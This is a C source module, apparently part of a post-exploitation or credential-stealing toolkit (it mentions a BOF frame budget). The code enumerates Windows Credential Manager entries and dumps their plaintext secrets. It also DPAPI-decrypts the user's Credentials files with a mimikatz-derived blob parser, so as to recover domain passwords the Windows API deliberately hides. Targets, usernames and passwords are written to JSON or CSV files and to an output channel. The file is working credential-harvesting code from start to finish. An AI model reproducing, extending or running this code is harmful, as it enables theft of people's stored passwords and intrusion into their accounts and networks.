/* bd_winvcreds.c - Windows Credential Manager dump (CredEnumerateW).
 * Generic credentials (CRED_TYPE_GENERIC, type 1) carry a CredentialBlob that
 * is frequently a plaintext secret (browser-saved app passwords, git, wifi
 * UI, etc.). Domain-password blobs (type 2) are opaque to the API, so we
 * report their presence without inventing plaintext. */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "bd.h"

extern void  *malloc(size_t);
extern void   free(void *);
extern void  *memset(void *, int, size_t);
extern void  *memcpy(void *, const void *, size_t);
extern size_t strlen(const char *);
extern int    _snprintf(char *, size_t, const char *, ...);
extern char  *getenv(const char *);

typedef struct _bd_cred {
    DWORD     Flags;
    DWORD     Type;
    LPWSTR    TargetName;
    LPWSTR    Comment;
    FILETIME  LastWritten;
    DWORD     CredentialBlobSize;
    LPBYTE    CredentialBlob;
    DWORD     Persist;
    DWORD     AttributeCount;
    PVOID     Attributes;
    LPWSTR    TargetAlias;
    LPWSTR    UserName;
} BD_CREDENTIAL;

typedef int   (WINAPI *pCredEnumerateW)(const wchar_t *, DWORD, DWORD *, BD_CREDENTIAL ***);
typedef void  (WINAPI *pCredFreeW)(PVOID);

static const char *cred_type_name(DWORD t) {
    switch (t) {
    case 1: return "generic";
    case 2: return "domain_password";
    case 3: return "domain_certificate";
    case 4: return "domain_visible_password";
    default: return "generic";
    }
}

static void wide_to_utf8(const wchar_t *w, char *out, size_t cap) {
    if (!w) { out[0] = 0; return; }
    WideCharToMultiByte(CP_UTF8, 0, w, -1, out, (int)cap, NULL, NULL);
    out[cap - 1] = 0;
}

/* blob -> printable string if it looks like text, else hex head */
static void blob_to_str(const unsigned char *b, size_t n, char *out, size_t cap) {
    size_t i; int printable = (n > 0);
    if (!b || n == 0) { out[0] = 0; return; }
    for (i = 0; i < n && i < 256; i++) {
        unsigned char c = b[i];
        if ((c < 0x20 && c != '\t' && c != '\r' && c != '\n') || c == 0) { printable = 0; break; }
    }
    if (printable) {
        size_t take = n < cap - 1 ? n : cap - 1;
        memcpy(out, b, take);
        out[take] = 0;
    } else {
        size_t take = (n < 16 ? n : 16), pos = 0;
        static const char H[] = "0123456789abcdef";
        for (i = 0; i < take && pos + 3 < cap; i++) {
            out[pos++] = H[(b[i] >> 4) & 0xf];
            out[pos++] = H[b[i] & 0xf];
            out[pos++] = ' ';
        }
        out[pos] = 0;
    }
}

/* tiny emit context mirroring the other extractors */
typedef struct {
    bd_out *out;
    bd_sb   sb;
    int     fmt;
    int     rows;
    char    filePath[700];
} wc_emit;

static void wc_kv(wc_emit *e, const char *k, const char *v, int first) {
    if (e->fmt == BD_FMT_JSON) {
        char kb[48];
        _snprintf(kb, sizeof(kb), "%s\"%s\":", first ? "" : ",", k);
        bd_sb_put(&e->sb, kb);
        bd_sb_json_str(&e->sb, v);
    } else {
        if (!first) bd_sb_put(&e->sb, ",");
        bd_sb_csv_field(&e->sb, v);
    }
}

/* ----------------------------------------------- KULL_M_CRED_BLOB parser -- */
/* The DPAPI-decrypted "Microsoft\Credentials\<hash>" file is a KULL_M_CRED_BLOB:
 *   12 DWORD header (credFlags..dwTargetName), then length-prefixed UTF-16LE
 *   fields in order: TargetName, UnkData, Comment, TargetAlias, UserName,
 *   CredentialBlob (the password). Field lengths are in BYTES.
 *   (mimikatz kull_m_cred.c kull_m_cred_create). */
static unsigned int rd32(const unsigned char *p) {
    return (unsigned)p[0] | ((unsigned)p[1] << 8) | ((unsigned)p[2] << 16) | ((unsigned)p[3] << 24);
}
static void w2u_len(const wchar_t *w, size_t wchars, char *out, size_t cap) {
    if (!w || !wchars) { out[0] = 0; return; }
    WideCharToMultiByte(CP_UTF8, 0, w, (int)wchars, out, (int)cap, NULL, NULL);
    out[cap - 1] = 0;
}
static int parse_cred_blob(const unsigned char *b, size_t n,
                           char *target, size_t tcap, char *user, size_t ucap, char *pass, size_t pcap) {
    size_t off = 48;   /* FIELD_OFFSET(KULL_M_CRED_BLOB, TargetName) */
    unsigned int dw;
    if (n < 48) return -1;
    dw = rd32(b + 44);                       /* dwTargetName */
    if (off + dw > n) return -1;
    w2u_len((const wchar_t *)(b + off), dw / 2, target, tcap);
    off += dw;
    if (off + 4 > n) return -1; dw = rd32(b + off); off += 4; off += dw;  /* UnkData */
    if (off + 4 > n) return -1; dw = rd32(b + off); off += 4; off += dw;  /* Comment */
    if (off + 4 > n) return -1; dw = rd32(b + off); off += 4; off += dw;  /* TargetAlias */
    if (off + 4 > n) return -1; dw = rd32(b + off); off += 4;             /* dwUserName */
    if (off + dw > n) return -1;
    w2u_len((const wchar_t *)(b + off), dw / 2, user, ucap);
    off += dw;
    if (off + 4 > n) return -1; dw = rd32(b + off); off += 4;             /* CredentialBlobSize */
    if (off + dw > n) return -1;
    w2u_len((const wchar_t *)(b + off), dw / 2, pass, pcap);
    return 0;
}

static void cred_files_extract(wc_emit *e, int *first) {
    char dir[600], pattern[620], t[400], u[400], pw[700];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    const char *appdata = getenv("APPDATA");

    if (!appdata || !*appdata) return;
    _snprintf(dir, sizeof(dir), "%s\\Microsoft\\Credentials", appdata);
    _snprintf(pattern, sizeof(pattern), "%s\\*", dir);
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        char full[700];
        unsigned char *data = NULL; size_t dlen = 0;
        unsigned char *pt = NULL; size_t ptlen = 0;
        if (fd.cFileName[0] == '.') continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (!_snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName)) continue;
        if (bd_read_file(full, (char **)&data, &dlen) != 0 || !data) continue;
        if (bd_dpapi_decrypt(data, dlen, &pt, &ptlen) == 0 && pt && ptlen) {
            if (parse_cred_blob(pt, ptlen, t, sizeof(t), u, sizeof(u), pw, sizeof(pw)) == 0) {
                if (e->fmt == BD_FMT_JSON) {
                    if (!*first) bd_sb_put(&e->sb, ",");
                    bd_sb_put(&e->sb, "{");
                    wc_kv(e, "target", t, 1);
                    wc_kv(e, "type", "domain_password", 0);
                    wc_kv(e, "username", u, 0);
                    wc_kv(e, "password", pw, 0);
                    bd_sb_put(&e->sb, "}");
                } else {
                    wc_kv(e, "target", t, 1);
                    wc_kv(e, "type", "domain_password", 0);
                    wc_kv(e, "username", u, 0);
                    wc_kv(e, "password", pw, 0);
                    bd_sb_put(&e->sb, "\r\n");
                }
                if (e->out->human && e->out->chunk) {
                    char line[1400];
                    int ln = _snprintf(line, sizeof(line), "    %s | %s | %s\r\n",
                                       t, u[0] ? u : "-", pw[0] ? pw : "-");
                    if (ln > 0) e->out->chunk(e->out->ctx, line, ln);
                }
                *first = 0;
                e->rows++;
            }
            bd_local_free((unsigned long)(size_t)pt);
        }
        free(data);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

void bd_winvcreds_extract(bd_out *out, int *files) {
    HMODULE adv;
    pCredEnumerateW fnEnum;
    pCredFreeW fnFree;
    BD_CREDENTIAL **creds = NULL;
    DWORD count = 0, i;
    wc_emit e;
    int first = 1;
    wchar_t filter[] = L"*";

    if (!out) return;
    adv = LoadLibraryA("advapi32.dll");
    if (!adv) return;
    fnEnum = (pCredEnumerateW)GetProcAddress(adv, "CredEnumerateW");
    fnFree = (pCredFreeW)GetProcAddress(adv, "CredFree");
    if (!fnEnum || !fnFree) { FreeLibrary(adv); return; }
    if (!fnEnum(filter, 0, &count, &creds)) { FreeLibrary(adv); return; }

    memset(&e, 0, sizeof(e));
    e.out = out;
    e.fmt = out->fmt;
    bd_sb_init(&e.sb);
    if (e.fmt == BD_FMT_JSON) {
        bd_sb_put(&e.sb, "{\"browser\":\"Windows\",\"profile\":\"credential-manager\",\"category\":\"wincreds\",\"rows\":[");
    } else {
        bd_sb_put(&e.sb, "target,type,username,password,comment\r\n");
    }

    for (i = 0; i < count; i++) {
        BD_CREDENTIAL *c = creds[i];
        char target[260], user[260], comment[400], blob[300], type[24];
        if (!c || !c->TargetName) continue;

        wide_to_utf8(c->TargetName, target, sizeof(target));
        wide_to_utf8(c->UserName, user, sizeof(user));
        wide_to_utf8(c->Comment, comment, sizeof(comment));
        _snprintf(type, sizeof(type), "%s", cred_type_name(c->Type));
        if (c->Type == 2)   /* domain_password: API never returns plaintext */
            _snprintf(blob, sizeof(blob), "<not recoverable via CredAPI>");
        else
            blob_to_str(c->CredentialBlob, c->CredentialBlobSize, blob, sizeof(blob));

        if (e.fmt == BD_FMT_JSON) {
            if (!first) bd_sb_put(&e.sb, ",");
            bd_sb_put(&e.sb, "{");
            wc_kv(&e, "target", target, 1);
            wc_kv(&e, "type", type, 0);
            wc_kv(&e, "username", user, 0);
            wc_kv(&e, "password", blob, 0);
            wc_kv(&e, "comment", comment, 0);
            bd_sb_put(&e.sb, "}");
        } else {
            wc_kv(&e, "target", target, 1);
            wc_kv(&e, "type", type, 0);
            wc_kv(&e, "username", user, 0);
            wc_kv(&e, "password", blob, 0);
            wc_kv(&e, "comment", comment, 0);
            bd_sb_put(&e.sb, "\r\n");
        }
        if (out->human && out->chunk) {
            static char line[700];   /* off the stack: BOF frame budget */
            int n = _snprintf(line, sizeof(line), "    %s | %s | %s%s%s\r\n",
                              target, user[0] ? user : "-",
                              blob[0] ? blob : "-",
                              comment[0] ? "  # " : "", comment[0] ? comment : "");
            if (n > 0) out->chunk(out->ctx, line, n);
        }
        first = 0;
        e.rows++;
    }
    fnFree(creds);
    FreeLibrary(adv);

    /* DPAPI-decrypt the underlying credential files to recover the
     * domain-password plaintext that CredEnumerateW deliberately hides. */
    cred_files_extract(&e, &first);

    if (e.fmt == BD_FMT_JSON) bd_sb_put(&e.sb, "]}");

    if (out->outDir && *out->outDir) {
        _snprintf(e.filePath, sizeof(e.filePath), "%s\\wincreds_credential-manager.%s",
                  out->outDir, e.fmt == BD_FMT_JSON ? "json" : "csv");
        bd_write_file(e.filePath, e.sb.buf, e.sb.len);
        if (out->logf)
            out->logf(out->ctx, "[+] Windows/credential-manager wincreds: %d rows -> %s",
                      e.rows, e.filePath);
    } else if (out->logf) {
        out->logf(out->ctx, "[+] Windows/credential-manager wincreds: %d rows", e.rows);
    }
    if (out->verbose && out->chunk && e.sb.len)
        out->chunk(out->ctx, e.sb.buf, (int)e.sb.len);
    if (files && out->outDir && *out->outDir) (*files)++;
    bd_sb_free(&e.sb);
}
